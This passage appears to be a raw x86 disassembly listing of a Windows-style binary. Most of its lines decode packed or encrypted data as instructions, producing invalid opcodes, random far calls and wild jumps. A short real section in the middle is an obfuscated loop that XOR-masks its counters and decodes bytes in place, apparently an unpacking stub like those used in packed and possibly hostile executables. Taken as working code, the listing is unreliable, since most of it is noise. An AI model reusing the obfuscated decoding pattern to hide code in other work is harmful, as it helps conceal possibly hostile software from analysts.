  40581f:	cwde   
  405820:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405821:	fwait
  405822:	pop    ecx
  405823:	imul   BYTE PTR [ecx-0x31b42460]
  405829:	dec    ecx
  40582a:	inc    edx
  40582b:	rol    BYTE PTR [edi-0x1339c601],1
  405831:	dec    eax
  405832:	xor    dl,BYTE PTR [ecx+0x6bccfc56]
  405838:	xor    eax,0x2fd1f3d8
  40583d:	xchg   DWORD PTR [esi],eax
  40583f:	or     al,0x77
  405841:	dec    edx
  405842:	mov    ecx,0xe620f28d
  405847:	pop    ss
  405848:	out    dx,eax
  405849:	push   ebp
  40584a:	sub    BYTE PTR [ecx-0x11340c3],dh
  405850:	xchg   esi,eax
  405851:	lock inc edx
  405853:	xchg   esp,eax
  405854:	nop
  405855:	jne    0x4057e2
  405857:	pop    ebx
  405858:	les    esi,FWORD PTR [ebp+0x123cf39f]
  40585e:	sbb    al,0xc6
  405860:	mov    ebx,0x58032526
  405865:	sbb    eax,ebx
  405867:	je     0x40584b
  405869:	aam    0xa1
  40586b:	push   ecx
  40586c:	retf   0xb6e1
  40586f:	dec    ecx
  405870:	clc    
  405871:	js     0x405896
  405873:	aaa    
  405874:	mov    ch,bl
  405876:	mov    eax,0x643dc8b
  40587b:	push   ds
  40587c:	cs sahf 
  40587e:	push   ecx
  40587f:	pusha  
  405880:	pop    ds
  405881:	or     eax,0x487b96d8
  405886:	inc    ecx
  405887:	push   0xed4bc110
  40588c:	mov    al,0x4a
  40588e:	sub    al,0xeb
  405890:	push   edi
  405891:	inc    edi
  405892:	loop   0x4058d4
  405894:	cmp    eax,0xfdc518cd
  405899:	out    0x77,eax
  40589b:	in     al,dx
  40589c:	test   edi,eax
  40589e:	push   edi
  40589f:	repz mov bh,0x4
  4058a2:	rcr    DWORD PTR [esi+0x2c64889d],cl
  4058a8:	test   DWORD PTR [ebx-0x5],esp
  4058ab:	out    dx,eax
  4058ac:	push   ss
  4058ad:	jne    0x4058b1
  4058af:	enter  0x8e2b,0x4e
  4058b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b4:	imul   ecx,edi,0xffffffa0
  4058b7:	push   eax
  4058b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058b9:	jmp    0x4058a9
  4058bb:	jnp    0x4058b0
  4058bd:	mov    ebp,0xeae1de98
  4058c2:	ss pusha 
  4058c4:	(bad)  
  4058c5:	imul   BYTE PTR [edi+0x1e]
  4058c8:	mov    ds:0xc034a4e5,eax
  4058cd:	stos   BYTE PTR es:[edi],al
  4058ce:	cmp    BYTE PTR [eax-0x79a8f0a9],bl
  4058d4:	mov    BYTE PTR ss:[ebx],cl
  4058d7:	inc    ebp
  4058d8:	btc    DWORD PTR [edx+0x7e],eax
  4058dc:	push   edx
  4058dd:	loope  0x4058ad
  4058df:	imul   edi,DWORD PTR [ebx],0x39
  4058e2:	shl    al,0xc7
  4058e5:	sbb    esi,DWORD PTR [edi]
  4058e7:	and    esp,DWORD PTR [ebx+eax*1-0x7c]
  4058eb:	mov    BYTE PTR [edi+0x583128f],ah
  4058f1:	aaa    
  4058f2:	(bad)  
  4058f3:	repz loope 0x40592c
  4058f6:	scas   eax,DWORD PTR es:[edi]
  4058f7:	cli    
  4058f8:	ss cld 
  4058fa:	mov    ds:0x47ea03a7,al
  4058ff:	pop    ecx
  405900:	outs   dx,DWORD PTR ds:[esi]
  405901:	add    eax,0x8158c32b
  405906:	stos   BYTE PTR es:[di],al
  405908:	repz push es
  40590a:	sbb    eax,0x8ed93104
  40590f:	loopne 0x405960
  405911:	loop   0x4058d1
  405913:	push   esp
  405914:	add    BYTE PTR [edx+0x1b],0xec
  405918:	jo     0x40592e
  40591a:	inc    ecx
  40591b:	mov    ah,0x5f
  40591d:	mov    dl,0x17
  40591f:	iret   
  405920:	out    dx,al
  405921:	out    0x9f,al
  405923:	mov    ecx,0xcac98f6e
  405928:	test   dl,0x62
  40592b:	sub    cl,al
  40592d:	scas   al,BYTE PTR es:[edi]
  40592e:	icebp  
  40592f:	push   ebx
  405930:	xchg   BYTE PTR [edi+0x356bbe09],cl
  405936:	or     bl,BYTE PTR [ecx+0x7]
  405939:	arpl   WORD PTR [ecx],dx
  40593b:	or     al,0xd6
  40593d:	add    DWORD PTR [eax],ebx
  40593f:	jl     0x405950
  405941:	sbb    BYTE PTR [ecx+0x31eb178d],al
  405947:	push   edx
  405948:	in     eax,dx
  405949:	jp     0x4058ee
  40594b:	sar    BYTE PTR [edx-0x50],0xe6
  40594f:	jg     0x4058f0
  405951:	cld    
  405952:	jns    0x4058d6
  405954:	je     0x17bfbac8
  40595a:	lods   al,BYTE PTR ds:[esi]
  40595b:	lock paddusb mm1,QWORD PTR [eax+0x4e]
  405960:	pop    edx
  405961:	ins    DWORD PTR es:[edi],dx
  405962:	test   al,0x38
  405964:	aaa    
  405965:	out    dx,al
  405966:	pop    eax
  405967:	jo     0x405931
  405969:	jnp    0x405974
  40596b:	out    dx,al
  40596c:	mov    edi,0x2d16c00f
  405971:	scas   al,BYTE PTR es:[edi]
  405972:	jecxz  0x405949
  405974:	mov    eax,0x4fc4c14
  405979:	(bad)  
  40597a:	out    dx,eax
  40597b:	cmp    ah,BYTE PTR [ecx-0x47]
  40597e:	daa    
  40597f:	call   0x85704cc9
  405984:	mov    ebx,0xf4849951
  405989:	pop    esi
  40598a:	mov    ch,0x2b
  40598c:	(bad)  
  40598e:	sbb    bl,BYTE PTR [eax+eax*8+0x7f]
  405992:	mov    ebx,0x5759a9bd
  405997:	mov    ecx,0xfd94b020
  40599c:	mov    ecx,0xb2828498
  4059a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059a2:	enter  0x14eb,0xd8
  4059a6:	cmpxchg eax,esp
  4059a9:	mov    bh,BYTE PTR [ebx-0x192e237d]
  4059af:	fs dec esp
  4059b1:	pminsw mm5,QWORD PTR ds:0x76d52878
  4059b8:	outs   dx,DWORD PTR ds:[esi]
  4059b9:	jbe    0x4059b9
  4059bb:	sbb    BYTE PTR [ebp+0x6a],bh
  4059be:	hlt    
  4059bf:	pop    ecx
  4059c0:	inc    edx
  4059c1:	loope  0x4059fd
  4059c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4059c4:	inc    edi
  4059c5:	mov    al,ds:0x660bd6f6
  4059ca:	mov    ebp,0x5671c042
  4059cf:	in     eax,0x6e
  4059d1:	mov    ds:0x4b434b99,al
  4059d6:	dec    esi
  4059d7:	adc    eax,0x776ce9b0
  4059dc:	out    dx,al
  4059dd:	and    ah,BYTE PTR [ebx+ebx*8-0x59c88f7d]
  4059e4:	cmc    
  4059e5:	not    DWORD PTR [ecx]
  4059e7:	jl     0x405a09
  4059e9:	adc    ecx,DWORD PTR [ecx+edi*1+0x7b600f0d]
  4059f0:	dec    esp
  4059f1:	daa    
  4059f2:	imul   esp,DWORD PTR [ebx+ebp*8+0x19cf3cce],0x7b
  4059fa:	cdq    
  4059fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4059fc:	pop    edi
  4059fd:	pop    ebx
  4059fe:	pop    esp
  4059ff:	(bad)  
  405a00:	dec    ebp
  405a01:	loop   0x405a72
  405a03:	add    eax,0x43d984b7
  405a08:	and    eax,0x6a0514a1
  405a0d:	jno    0x405a8c
  405a0f:	cs in  al,0xd1
  405a12:	mov    bh,0xf0
  405a14:	add    ebp,DWORD PTR [ecx]
  405a16:	cmc    
  405a17:	cmp    DWORD PTR [esi+0x2e],ebp
  405a1a:	outs   dx,DWORD PTR ds:[esi]
  405a1b:	xor    eax,DWORD PTR [esi-0x2]
  405a1e:	hlt    
  405a1f:	pop    esi
  405a20:	imul   edx
  405a22:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405a23:	inc    edx
  405a24:	mov    dh,0xcf
  405a26:	je     0x405a4d
  405a28:	mov    al,0xd6
  405a2a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a2b:	arpl   WORD PTR [edx-0x36],si
  405a2e:	mov    dl,0xcf
  405a30:	popa   
  405a31:	or     DWORD PTR ds:[edx],esi
  405a34:	push   esp
  405a35:	and    edx,DWORD PTR [edx+0x67]
  405a38:	dec    eax
  405a39:	retf   
  405a3a:	call   0x82ac:0x595fb69f
  405a41:	daa    
  405a42:	std    
  405a43:	push   ds
  405a44:	rcr    ecx,cl
  405a46:	add    bh,BYTE PTR [edx]
  405a48:	jp     0x405a5e
  405a4a:	cmp    DWORD PTR [ebp+0x25],ebx
  405a4d:	call   0x5dce:0xed5521dc
  405a54:	data16 fistp DWORD PTR [edx+0x7392c3d0]
  405a5b:	adc    esp,DWORD PTR [ebx+0x3d2f7112]
  405a61:	lods   eax,DWORD PTR ds:[esi]
  405a62:	scas   al,BYTE PTR es:[edi]
  405a63:	ud1    ecx,DWORD PTR [eax+0x6e]
  405a67:	add    eax,0xac88fdf
  405a6c:	add    ch,ch
  405a6e:	or     cl,BYTE PTR [eax+0x49]
  405a71:	ret    0x17d2
  405a74:	popa   
  405a75:	mov    al,ds:0x449993be
  405a7a:	or     eax,0xc475eeb1
  405a7f:	adc    al,0x78
  405a81:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405a82:	out    0x2a,al
  405a84:	cmp    esp,DWORD PTR [edx-0x27]
  405a87:	sbb    cl,ch
  405a89:	mov    al,ds:0x6da60ecb
  405a8e:	sub    ebp,esi
  405a90:	xor    DWORD PTR [edx+ecx*8+0x766da08b],0xffffffdd
  405a98:	jbe    0x405ad9
  405a9a:	push   ss
  405a9b:	xor    BYTE PTR ds:0xad0786d2,bl
  405aa1:	sbb    BYTE PTR [esp+ebx*1-0x11fd7f18],dl
  405aa8:	fnstenv [edi]
  405aaa:	ja     0x405ac7
  405aac:	or     al,0x8
  405aae:	stc    
  405aaf:	lods   eax,DWORD PTR ds:[esi]
  405ab0:	jnp    0x405a7e
  405ab2:	dec    ebp
  405ab3:	popf   
  405ab4:	mov    ch,0x81
  405ab6:	pop    ecx
  405ab7:	xchg   BYTE PTR [ebx+0x135ba206],ch
  405abd:	fs sbb dh,bh
  405ac0:	fmul   DWORD PTR [ecx+0x5a]
  405ac3:	sti    
  405ac4:	out    dx,eax
  405ac5:	aaa    
  405ac6:	and    al,0x37
  405ac8:	xor    ch,dh
  405aca:	shl    BYTE PTR [eax+0x60364bea],0x23
  405ad1:	or     edx,DWORD PTR gs:[ebp-0x67]
  405ad5:	call   0x5f89:0xe83beb25
  405adc:	shl    DWORD PTR [eax],1
  405ade:	cmp    bh,cl
  405ae0:	dec    esp
  405ae1:	inc    ecx
  405ae2:	adc    DWORD PTR [edi-0x39954ede],0x1f
  405ae9:	stc    
  405aea:	sub    BYTE PTR [ecx+0x205ee2bb],0xbd
  405af1:	push   ds
  405af2:	xchg   ecx,eax
  405af3:	int    0xcc
  405af5:	adc    eax,0x9cb57f72
  405afa:	jo     0x405a90
  405afc:	inc    eax
  405afd:	test   eax,0x84744f27
  405b02:	mov    al,ds:0x444b7f42
  405b07:	(bad)  
  405b08:	dec    eax
  405b09:	aas    
  405b0a:	lahf   
  405b0b:	xchg   ebx,eax
  405b0c:	daa    
  405b0d:	mov    ah,0x20
  405b0f:	xchg   ebp,eax
  405b10:	jle    0x405aea
  405b12:	dec    eax
  405b13:	and    eax,0xbef69926
  405b18:	jnp    0x405b46
  405b1a:	fsubr  st,st(5)
  405b1c:	or     eax,ebx
  405b1e:	mov    esp,0xa7dc172
  405b23:	in     al,dx
  405b24:	lock dec ecx
  405b26:	(bad)  
  405b28:	inc    edi
  405b29:	pop    ds
  405b2a:	add    al,0x31
  405b2c:	sbb    al,0x5d
  405b2e:	stc    
  405b2f:	in     eax,0xe3
  405b31:	(bad)  
  405b32:	sti    
  405b33:	lea    ebp,[esi]
  405b35:	adc    ah,dl
  405b37:	in     al,dx
  405b38:	(bad)  
  405b39:	lds    edi,FWORD PTR [eax+edi*1+0x4f]
  405b3d:	inc    ebp
  405b3e:	in     eax,dx
  405b3f:	pushf  
  405b40:	xchg   ecx,eax
  405b41:	push   ecx
  405b42:	xchg   esi,eax
  405b43:	sub    eax,0x13403876
  405b48:	pop    es
  405b49:	add    BYTE PTR [edx+eiz*4-0x28157205],bh
  405b50:	pop    eax
  405b51:	xchg   BYTE PTR [edi+0x53],ah
  405b54:	pop    ss
  405b55:	sub    bh,BYTE PTR [esi]
  405b57:	out    dx,eax
  405b58:	ja     0x405b34
  405b5a:	xor    DWORD PTR [edi-0x16a7d505],edx
  405b60:	push   es
  405b61:	stos   DWORD PTR es:[edi],eax
  405b62:	lds    edi,FWORD PTR [ecx+0x57]
  405b65:	dec    esp
  405b66:	adc    al,0x98
  405b68:	push   edx
  405b69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b6a:	aam    0x30
  405b6c:	shl    BYTE PTR [edi],cl
  405b6e:	in     al,dx
  405b6f:	out    dx,al
  405b70:	push   edx
  405b71:	inc    edx
  405b72:	f2xm1  
  405b74:	es push es
  405b76:	push   eax
  405b77:	pop    ecx
  405b78:	cwde   
  405b79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405b7a:	cmp    DWORD PTR [ebp-0x55],edi
  405b7d:	and    bh,al
  405b7f:	dec    edx
  405b80:	fistp  DWORD PTR [esi]
  405b82:	into   
  405b83:	add    esi,esp
  405b85:	and    BYTE PTR [edx-0x6c],dl
  405b88:	jo     0x405bcc
  405b8a:	sar    DWORD PTR [esi-0x5fc8822e],0xac
  405b91:	mov    edi,0x9ed1abb6
  405b96:	push   ebp
  405b97:	adc    DWORD PTR [edi],0xffffffef
  405b9a:	aaa    
  405b9b:	in     al,dx
  405b9c:	stos   DWORD PTR es:[edi],eax
  405b9d:	sub    bh,BYTE PTR [edx-0x40]
  405ba0:	adc    DWORD PTR ds:[ecx],ebx
  405ba3:	push   edi
  405ba4:	pop    es
  405ba5:	sub    DWORD PTR [edi*8+0x1f81e98e],0x22
  405bad:	(bad)  
  405bae:	mov    ds,eax
  405bb0:	les    ebx,FWORD PTR [eax-0x39ca1b9a]
  405bb6:	iret   
  405bb7:	retf   
  405bb8:	xchg   edx,eax
  405bb9:	idiv   bl
  405bbb:	cmp    DWORD PTR [edi],0xffffffbf
  405bbe:	sub    al,0x69
  405bc0:	add    al,0xfc
  405bc2:	fcmovbe st,st(4)
  405bc4:	or     al,0xcc
  405bc6:	sub    al,0x4f
  405bc8:	int    0xba
  405bca:	jo     0x405b62
  405bcc:	loopne 0x405b9f
  405bce:	(bad)  
  405bcf:	das    
  405bd0:	ret    0x2ff8
  405bd3:	sub    al,0xf2
  405bd5:	pusha  
  405bd6:	dec    edx
  405bd7:	shl    DWORD PTR [esi],1
  405bd9:	repz dec ebx
  405bdb:	mov    al,ds:0x822f7717
  405be0:	jp     0x405c5b
  405be2:	sub    dh,al
  405be4:	icebp  
  405be5:	fidiv  WORD PTR [esi-0x17]
  405be8:	and    al,0x15
  405bea:	xor    al,0x4c
  405bec:	(bad)  
  405bed:	lahf   
  405bee:	jl     0x405bf2
  405bf0:	mul    DWORD PTR [ebx+0x7a]
  405bf3:	lds    esi,FWORD PTR [edi-0x20a2bb9]
  405bf9:	sbb    esi,DWORD PTR [ecx]
  405bfb:	dec    edi
  405bfc:	dec    ecx
  405bfd:	(bad)  
  405bfe:	in     al,0xa5
  405c00:	sbb    al,BYTE PTR [edx+0x6f]
  405c03:	sbb    al,0x19
  405c05:	sbb    al,BYTE PTR [esi-0x540b5faa]
  405c0b:	mov    esp,0x350f1042
  405c10:	jne    0x405bf0
  405c12:	mov    edx,0xea65eee2
  405c17:	and    BYTE PTR [eax+0x2b50720d],dl
  405c1d:	ret    
  405c1e:	cmp    edx,eax
  405c20:	jne    0x405caa
  405c26:	mov    eax,DWORD PTR [ebp-0xc]
  405c29:	mov    dl,BYTE PTR [eax+ecx*1+0x801]
  405c30:	mov    eax,DWORD PTR [ebp-0x20]
  405c33:	mov    ebx,DWORD PTR [ebp-0x18]
  405c36:	xor    eax,esi
  405c38:	xor    ebx,esi
  405c3a:	add    eax,edi
  405c3c:	add    ebx,edi
  405c3e:	mov    BYTE PTR [ebp-0x1],dl
  405c41:	cmp    eax,ebx
  405c43:	jae    0x405c98
  405c49:	lea    edx,[eax-0x3272ec]
  405c4f:	mov    DWORD PTR [ebp-0x14],edx
  405c52:	mov    ebx,DWORD PTR [ebp-0x14]
  405c55:	xor    ebx,esi
  405c57:	add    ebx,0x7f55d8f2
  405c5d:	lea    edx,[ebp+eax*4-0x3c]
  405c61:	mov    DWORD PTR [edx],ebx
  405c63:	mov    ebx,DWORD PTR [edx]
  405c65:	cmp    ebx,0x244ecb93
  405c6b:	jbe    0x405c7c
  405c71:	add    DWORD PTR [edx],0x405fcdc
  405c77:	jmp    0x405c82
  405c7c:	add    DWORD PTR [edx],0xfdaf4324
  405c82:	mov    edx,DWORD PTR [ebp-0x18]
  405c85:	xor    edx,esi
  405c87:	inc    eax
  405c88:	inc    DWORD PTR [ebp-0x14]
  405c8b:	add    edx,edi
  405c8d:	cmp    eax,edx
  405c8f:	jb     0x405c52
  405c95:	mov    dl,BYTE PTR [ebp-0x1]
  405c98:	xor    dl,0x79
  405c9b:	sub    dl,0x3
  405c9e:	xor    eax,eax
  405ca0:	mov    eax,DWORD PTR [ebp-0xc]
  405ca3:	mov    BYTE PTR [eax+ecx*1+0x801],dl
  405caa:	mov    eax,DWORD PTR [ebp-0xc]
  405cad:	mov    edx,DWORD PTR [ebp-0x20]
  405cb0:	sub    eax,edi
  405cb2:	xor    eax,esi
  405cb4:	cmp    eax,edx
  405cb6:	jne    0x40809e
  405cbc:	mov    eax,DWORD PTR [ebp-0x10]
  405cbf:	mov    edx,DWORD PTR [ebp-0x8]
  405cc2:	xor    eax,esi
  405cc4:	xor    edx,esi
  405cc6:	sub    eax,edx
  405cc8:	sub    eax,edi
  405cca:	xor    eax,esi
  405ccc:	mov    DWORD PTR [ebp-0x10],eax
  405ccf:	mov    eax,DWORD PTR [ebp-0x8]
  405cd2:	jmp    0x408090
  405cd7:	mov    eax,ds:0x7b519088
  405cdc:	dec    ecx
  405cdd:	mov    ds:0xeab98a78,eax
  405ce2:	fisub  WORD PTR ds:0x3c99aec9
  405ce8:	xor    edi,DWORD PTR [edx+0x7a]
  405ceb:	fstp   QWORD PTR [edi+0x7a]
  405cee:	jp     0x405c8d
  405cf0:	ins    BYTE PTR es:[edi],dx
  405cf1:	adc    BYTE PTR [eax-0x6c7a3df3],bh
  405cf7:	mov    ecx,0x6c7297fb
  405cfc:	add    DWORD PTR [edx+ebp*8-0x3355c43a],ebp
  405d03:	fs mov esi,0xca04b2d4
  405d09:	mov    al,0x73
  405d0b:	in     eax,dx
  405d0c:	add    bl,cl
  405d0e:	iret   
  405d0f:	sub    dl,BYTE PTR [esi-0x36]
  405d12:	push   ecx
  405d13:	dec    ebp
  405d14:	(bad)  
  405d15:	mov    fs,WORD PTR [esi-0xe]
  405d18:	sbb    eax,0x7c7af0d3
  405d1d:	out    dx,al
  405d1e:	je     0x405d08
  405d20:	adc    ah,dh
  405d22:	xchg   esi,eax
  405d23:	push   ebp
  405d24:	push   es
  405d25:	jns    0x405d8e
  405d27:	in     al,0x76
  405d29:	stos   DWORD PTR es:[edi],eax
  405d2a:	mov    WORD PTR [ebx-0x12],?
  405d2d:	mov    DWORD PTR [ebp-0x9bf40fd],edi
  405d33:	(bad)  
  405d34:	out    0x17,eax
  405d36:	fwait
  405d37:	sub    al,0x66
  405d39:	stc    
  405d3a:	cmp    al,0xa9
  405d3c:	xchg   edx,eax
  405d3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405d3e:	(bad)  
  405d41:	sbb    cl,BYTE PTR [eax]
  405d43:	add    BYTE PTR [esi-0x608f2f19],dh
  405d49:	in     al,0xc4
  405d4b:	rcl    DWORD PTR [eax],1
  405d4d:	das    
  405d4e:	js     0x405cfb
  405d50:	xchg   esi,eax
  405d51:	sub    ch,al
  405d53:	neg    BYTE PTR [ebp-0x54670857]
  405d59:	call   DWORD PTR [ebp+0x5f50b7ec]
  405d5f:	xor    BYTE PTR [edx+0x4aa48327],dl
  405d65:	test   BYTE PTR [ebp-0x38],bh
  405d68:	pop    ebp
  405d69:	std    
  405d6a:	jne    0x405ddc
  405d6c:	inc    eax
  405d6d:	inc    esi
  405d6e:	dec    ebp
  405d6f:	(bad)  
  405d71:	xchg   ebx,eax
  405d72:	jns    0x405d28
  405d74:	pop    edi
  405d75:	or     al,0x88
  405d77:	inc    ebp
  405d78:	int    0xb3
  405d7a:	loopne 0x405de8
  405d7c:	push   ss
  405d7d:	jl     0x405dfd
  405d7f:	test   BYTE PTR [edi-0x5bd6945f],dh
  405d85:	enter  0xffcc,0x8b
  405d89:	shl    DWORD PTR [esi-0x5a4ef695],0x7b
  405d90:	and    esp,0xffffffdd
  405d93:	sahf   
  405d94:	les    edi,FWORD PTR [edi-0x5fc170af]
  405d9a:	test   eax,0xdac7b190
  405d9f:	aaa    
  405da0:	jnp    0x405d72
  405da2:	rcl    BYTE PTR [edi-0x6a],0x3b
  405da6:	cmp    BYTE PTR [ebx+esi*2-0x18a40b92],ah
  405dad:	mov    ebp,0x66ccba54
  405db2:	cmp    edi,ebp
  405db4:	clc    
  405db5:	fstp   QWORD PTR ds:0xefbf0c4d
  405dbb:	clc    
  405dbc:	loope  0x405e16
  405dbe:	gs fdiv st(1),st
  405dc1:	inc    edi
  405dc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405dc3:	inc    ebx
  405dc4:	add    ah,BYTE PTR [ebp+0x488b7b2b]
  405dca:	mov    WORD PTR [esi-0x4c],ss
  405dcd:	popa   
  405dce:	mov    ch,0x71
  405dd0:	xor    ch,BYTE PTR [ebx]
  405dd2:	js     0x405e08
  405dd4:	pop    edi
  405dd5:	test   al,0xec
  405dd7:	fcmovu st,st(2)
  405dd9:	adc    bl,BYTE PTR [esp+eiz*4+0x183b53ee]
  405de0:	inc    ebx
  405de1:	mul    DWORD PTR [ecx+0x25e66830]
  405de7:	adc    bl,BYTE PTR [ebx+eiz*1+0x253771b9]
  405dee:	add    al,0x9d
  405df0:	call   0x9e00:0xf3239c65
  405df7:	jmp    0xb4ec:0x6012308b
  405dfe:	mov    ecx,DWORD PTR [esi]
  405e00:	mov    ah,0x88
  405e02:	pop    ds
  405e03:	push   edi
  405e04:	sbb    DWORD PTR [edi-0x60],ebp
  405e07:	dec    edi
  405e08:	xchg   ebp,eax
  405e09:	int3   
  405e0a:	aad    0x2b
  405e0c:	jp     0x405e5e
  405e0e:	adc    eax,0x2a5ec091
  405e13:	pop    edi
  405e14:	popa   
  405e15:	ds stos BYTE PTR es:[edi],al
  405e17:	pusha  
  405e18:	aad    0x3f
  405e1a:	xchg   esp,eax
  405e1b:	mov    esp,0x90e5eacb
  405e20:	sub    ebx,DWORD PTR [edi]
  405e22:	repnz mov ?,WORD PTR [eax-0x1c]
  405e26:	lods   al,BYTE PTR ds:[esi]
  405e27:	repz push esi
  405e29:	nop
  405e2a:	pusha  
  405e2b:	push   ebp
  405e2c:	jne    0x405e5a
  405e2e:	push   ds
  405e2f:	in     eax,0xdb
  405e31:	jge    0x405e29
  405e33:	imul   bh
  405e35:	and    al,0xb6
  405e37:	xchg   edi,eax
  405e38:	xchg   DWORD PTR [ecx-0x2f],eax
  405e3b:	push   ebx
  405e3c:	neg    DWORD PTR [edi+0x401c9282]
  405e42:	sub    cl,al
  405e44:	or     eax,0x1d21714b
  405e49:	or     DWORD PTR [ecx-0x7a],ebp
  405e4c:	int3   
  405e4d:	add    eax,0xf9c2a9bb
  405e52:	out    0x9d,eax
  405e54:	rcl    ebx,0xd6
  405e57:	pop    eax
  405e58:	jmp    0x62ae72ea
  405e5d:	pop    ds
  405e5e:	mov    edi,0x27608f9c
  405e63:	idiv   DWORD PTR [edi-0x51815d61]
  405e69:	fistp  QWORD PTR [ecx]
  405e6b:	jns    0x405e49
  405e6d:	es in  al,0x94
  405e70:	dec    ebx
  405e71:	xchg   edx,eax
  405e72:	sub    al,0x44
  405e74:	inc    edi
  405e75:	rcl    BYTE PTR [ebp+0x68012bbd],cl
  405e7b:	dec    bp
  405e7d:	daa    
  405e7e:	mov    ch,0x3a
  405e80:	dec    edx
  405e81:	inc    edx
  405e82:	push   ds
  405e83:	call   0x4c9c3807
  405e88:	ins    BYTE PTR es:[edi],dx
  405e89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405e8a:	push   esp
  405e8b:	jmp    0x405ea1
  405e8d:	test   BYTE PTR [esi+0x3fa7759],dl
  405e93:	enter  0xe69c,0xd
  405e97:	mov    bl,0x8c
  405e99:	add    al,0xf4
  405e9b:	shr    DWORD PTR [edi-0x3a433301],1
  405ea1:	xor    ecx,DWORD PTR [ecx+0x78]
  405ea4:	je     0x405efd
  405ea6:	sti    
  405ea7:	jns    0x405eb7
  405ea9:	fcomp  QWORD PTR [ebx+0x663ee6cd]
  405eaf:	lods   al,BYTE PTR ds:[esi]
  405eb0:	xor    ah,BYTE PTR [ecx-0x21f759d6]
  405eb6:	sub    ebp,DWORD PTR [edx]
  405eb8:	dec    ebx
  405eb9:	sbb    eax,0xf620bceb
  405ebe:	mov    esi,DWORD PTR [edx+0x3b]
  405ec1:	jp     0x405edc
  405ec3:	or     BYTE PTR [edx+0x6a],0x44
  405ec7:	arpl   WORD PTR [esi+ebp*1-0x48],si
  405ecb:	and    DWORD PTR [ecx+0x18],ecx
  405ece:	into   
  405ecf:	xchg   esi,eax
  405ed0:	jecxz  0x405f3e
  405ed2:	inc    ebp
  405ed3:	sub    DWORD PTR [ebx-0x1bd359d5],ebx
  405ed9:	sub    al,BYTE PTR [eax+ecx*4-0x6218cbfe]
  405ee0:	adc    al,0xb1
  405ee2:	add    BYTE PTR [ebp+0x7af2cf44],dl
  405ee8:	scas   al,BYTE PTR es:[edi]
  405ee9:	mov    ds:0x3a1e336a,eax
  405eee:	bound  ebp,QWORD PTR [ecx+ebp*2-0x40ed7830]
  405ef5:	xchg   ch,bl
  405ef7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ef8:	push   ecx
  405ef9:	jge    0x405f3c
  405efb:	ss dec ebp
  405efd:	stos   BYTE PTR es:[edi],al
  405efe:	out    0xdc,eax
  405f00:	cwde   
  405f01:	dec    ebp
  405f02:	and    DWORD PTR [edx],ecx
  405f04:	das    
  405f05:	pop    edx
  405f06:	leave  
  405f07:	es (bad) 
  405f09:	(bad)  
  405f0a:	sar    DWORD PTR [ebx],cl
  405f0c:	test   eax,0x9e10acb
  405f11:	dec    esp
  405f12:	pop    ebx
  405f13:	xchg   esp,eax
  405f14:	cli    
  405f15:	test   DWORD PTR [esi+esi*1],0x8a3057cf
  405f1c:	cmp    DWORD PTR [ebx+0x5145ef94],edi
  405f22:	popf   
  405f23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f24:	imul   DWORD PTR [ebp+0x3f90bd4e]
  405f2a:	add    eax,0xaaa8a292
  405f2f:	aad    0xd0
  405f31:	scas   al,BYTE PTR es:[edi]
  405f32:	xchg   ebp,eax
  405f33:	sahf   
  405f34:	jecxz  0x405edb
  405f36:	aas    
  405f37:	popf   
  405f38:	dec    edx
  405f39:	js     0x405f27
  405f3b:	stos   DWORD PTR es:[edi],eax
  405f3c:	mov    edx,0x2e841b77
  405f41:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f42:	inc    edx
  405f43:	aas    
  405f44:	cdq    
  405f45:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f46:	outs   dx,DWORD PTR ds:[esi]
  405f47:	iret   
  405f48:	cwde   
  405f49:	xor    BYTE PTR [ecx],bh
  405f4b:	imul   esi,DWORD PTR [ebp+0x6f],0x5c6bfe7a
  405f52:	sbb    esp,DWORD PTR [eax]
  405f54:	test   BYTE PTR [esi+0x24],0xc9
  405f58:	fdiv   QWORD PTR [edx+0x65]
  405f5b:	nop
  405f5c:	and    eax,0x23818ff6
  405f61:	js     0x405fdc
  405f63:	call   0xb310:0x10d17be3
  405f6a:	test   al,0xc5
  405f6c:	adc    al,0xeb
  405f6e:	pop    esi
  405f6f:	adc    al,BYTE PTR [eax-0x5e26da65]
  405f75:	mov    dh,0xc5
  405f77:	or     al,0xfc
  405f7a:	xor    cl,bl
  405f7c:	clc    
  405f7d:	sbb    BYTE PTR [ecx+0x266619a3],cl
  405f83:	pop    ebp
  405f84:	aam    0x54
  405f86:	cwde   
  405f87:	cmp    ch,BYTE PTR [esi-0x757d9c1e]
  405f8d:	jmp    0x260987e9
  405f92:	mov    ecx,0xd86ece47
  405f97:	add    DWORD PTR [eax+0x1948d16b],edi
  405f9d:	mov    WORD PTR [eax+0x1],fs
  405fa0:	daa    
  405fa1:	xchg   esp,eax
  405fa2:	dec    eax
  405fa3:	inc    ebp
  405fa4:	mov    al,0x11
  405fa6:	jmp    0x45d7:0xe4d8e252
  405fad:	cmc    
  405fae:	mov    ebp,DWORD PTR [ecx+eiz*8]
  405fb1:	pushf  
  405fb2:	iret   
  405fb3:	nop
  405fb4:	pop    ecx
  405fb5:	ror    BYTE PTR [eax+0x17],cl
  405fb8:	mov    ebx,0xe8904963
  405fbd:	aaa    
  405fbe:	(bad)  
  405fbf:	mov    ah,0x3
  405fc1:	cdq    
  405fc2:	add    DWORD PTR [edi],edx
  405fc4:	pop    edi
  405fc5:	icebp  
  405fc6:	out    0x9a,eax
  405fc8:	add    edx,eax
  405fca:	cmc    
  405fcb:	lock inc esi
  405fcd:	icebp  
  405fce:	out    dx,al
